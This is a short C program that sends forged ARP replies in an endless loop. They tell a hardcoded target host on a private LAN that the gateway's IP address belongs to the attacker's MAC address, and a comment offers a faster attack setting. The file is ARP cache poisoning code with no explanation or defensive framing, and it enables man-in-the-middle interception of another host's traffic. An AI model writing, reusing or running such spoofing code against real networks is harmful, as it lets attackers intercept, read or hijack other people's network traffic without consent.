#include "arp.h"
unsigned char MAC_SPOOFING[6]={0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
unsigned char MAC_SOURCE[6]={0x00, 0x0c, 0x29, 0xe3, 0x92, 0xfb};
//spoofed IP (ex: gateway)
#define IP_TRICK "192.168.160.2"
//target's MAC
unsigned char MAC_TARGET[6]={0x00, 0x0c, 0x29, 0x31, 0x28, 0xe5};
//target's IP
#define IP_TARGET "192.168.160.132"
int main(void)
{
    int sfd, len;
    struct arp_packet arp;
    struct in_addr inaddr_sender, inaddr_receiver;
    struct sockaddr_ll sl;
    sfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(-1 == sfd)
    {
        Debug_printf("socket");
    }
    memset(&arp, 0, sizeof(arp));

   //padding package
    memcpy(arp.mac_target,MAC_TARGET,sizeof(MAC_TARGET));
    memcpy(arp.mac_source, MAC_SOURCE,sizeof(MAC_SOURCE));
    arp.ethertype = htons(ETH_P_ARP);
    arp.hw_type = htons(0x1);
    arp.proto_type = htons(ETH_P_IP);
    arp.mac_addr_len = ETH_ALEN;
    arp.ip_addr_len = 4;
    arp.operation_code = htons(0x2);//0x1 is ARP request, 0x2 is ARP reply
    memcpy(arp.mac_sender, MAC_SOURCE,sizeof(MAC_SOURCE));
    inet_aton(IP_TRICK, &inaddr_sender);
    memcpy(&arp.ip_sender, &inaddr_sender, sizeof(inaddr_sender));
    memcpy(arp.mac_receiver,MAC_TARGET,sizeof(MAC_TARGET));
    inet_aton(IP_TARGET, &inaddr_receiver);
    memcpy(&arp.ip_receiver, &inaddr_receiver, sizeof(inaddr_receiver));

    memset(&sl, 0, sizeof(sl));
    sl.sll_family = AF_PACKET;
    sl.sll_ifindex = IFF_BROADCAST;
    while(1)
    {
        len = sendto(sfd, &arp, sizeof(arp), 0, (struct sockaddr*)&sl, sizeof(sl));
        if(-1 == len)
        {
            Debug_printf("sendto");
        }
        else
            printf("packets have been send \n");
        sleep(2);
        //usleep(1000); //faster attack
    }
    return 0;
}


